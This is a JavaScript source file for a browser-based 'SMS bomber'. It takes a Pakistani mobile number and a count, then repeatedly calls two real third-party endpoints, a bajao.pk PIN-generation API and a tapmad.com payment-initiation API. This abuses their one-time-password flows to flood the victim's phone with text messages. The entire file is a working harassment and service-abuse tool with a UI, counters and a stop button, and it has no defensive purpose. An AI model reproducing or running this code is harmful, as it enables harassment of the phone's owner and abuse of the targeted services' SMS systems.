class SMSBomber {
    constructor() {
        this.isBombing = false;
        this.stopRequested = false;
        this.totalRequested = 0;
        this.totalSent = 0;
        this.totalSuccess = 0;
        this.totalFailures = 0;
        
        this.initElements();
        this.bindEvents();
    }
    
    initElements() {
        this.elements = {
            phone: document.getElementById('phone'),
            count: document.getElementById('count'),
            status: document.getElementById('status'),
            progress: document.getElementById('progress'),
            counter: document.getElementById('counter'),
            bombBtn: document.getElementById('bombBtn'),
            stopBtn: document.getElementById('stopBtn')
        };
    }
    
    bindEvents() {
        this.elements.bombBtn.addEventListener('click', () => this.startBombing());
        this.elements.stopBtn.addEventListener('click', () => this.stopBombing());
    }
    
    async startBombing() {
        if (this.isBombing) return;
        
        const phone = this.elements.phone.value.trim();
        const count = parseInt(this.elements.count.value);
        
        if (!this.validateInputs(phone, count)) return;
        
        this.initializeBombing(count);
        
        try {
            for (let i = 0; i < count; i++) {
                if (this.stopRequested) break;
                
                const success = await this.sendOTP(phone, i);
                this.updateCounters(i + 1, success);
                
                if (i < count - 1 && !this.stopRequested) {
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
            }
            
            if (!this.stopRequested) {
                this.showCompletion();
            }
        } finally {
            this.cleanUp();
        }
    }
    
    validateInputs(phone, count) {
        if (!phone.match(/^923[0-9]{9}$/)) {
            alert('Please enter a valid phone number in format 923xxxxxxxxx');
            return false;
        }
        
        if (isNaN(count) || count < 1 || count > 100) {
            alert('Please enter a valid OTP count between 1-100');
            return false;
        }
        
        return true;
    }
    
    initializeBombing(count) {
        this.isBombing = true;
        this.stopRequested = false;
        this.totalRequested = count;
        this.totalSent = 0;
        this.totalSuccess = 0;
        this.totalFailures = 0;
        
        this.elements.bombBtn.disabled = true;
        this.elements.stopBtn.disabled = false;
        this.elements.status.innerText = '🔄 Sending OTPs...';
        this.elements.status.style.color = '#FFC107';
        this.elements.progress.style.width = '0%';
    }
    
    async sendOTP(phone, index) {
        const url = index % 2 === 0
            ? `https://bajao.pk/api/v2/login/generatePin?uuid=${phone}`
            : `https://tappayments.tapmad.com/pay/api/initiatePaymentTransactionNewPackage`;
        
        const options = index % 2 === 1 ? {
            method: 'POST',
            headers: { 
                'Content-Type': 'application/json', 
                'accept': 'application/json',
                'X-Requested-With': 'XMLHttpRequest'
            },
            body: JSON.stringify({
                Version: 'V1',
                Language: 'en',
                Platform: 'web',
                ProductId: 1733,
                MobileNo: phone,
                OperatorId: '100007',
                URL: 'https://www.tapmad.com/sign-up',
                source: 'organic',
                medium: 'organic'
            })
        } : { 
            method: 'POST',
            headers: {
                'X-Requested-With': 'XMLHttpRequest'
            }
        };
        
        try {
            const response = await fetch(url, options);
            if (response.ok) {
                this.elements.status.innerText = `✅ Sent ${index + 1} of ${this.totalRequested}`;
                return true;
            }
            throw new Error(`HTTP ${response.status}`);
        } catch (error) {
            this.elements.status.innerText = `⚠️ Failed to send OTP ${index + 1}`;
            return false;
        }
    }
    
    updateCounters(currentCount, success) {
        this.totalSent = currentCount;
        if (success) this.totalSuccess++;
        else this.totalFailures++;
        
        this.elements.progress.style.width = `${(this.totalSent/this.totalRequested)*100}%`;
        this.elements.counter.innerText = 
            `Sent: ${this.totalSent}/${this.totalRequested} | ` +
            `Success: ${this.totalSuccess} | Failed: ${this.totalFailures}`;
    }
    
    showCompletion() {
        this.elements.status.innerText = '✅ All OTPs Sent Successfully!';
        this.elements.status.style.color = '#4CAF50';
    }
    
    stopBombing() {
        if (this.isBombing) {
            this.stopRequested = true;
            this.elements.status.innerText = '⏹ Stopping bombing...';
        }
    }
    
    cleanUp() {
        this.isBombing = false;
        this.elements.bombBtn.disabled = false;
        this.elements.stopBtn.disabled = true;
    }
}

// Initialize when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    new SMSBomber();
});
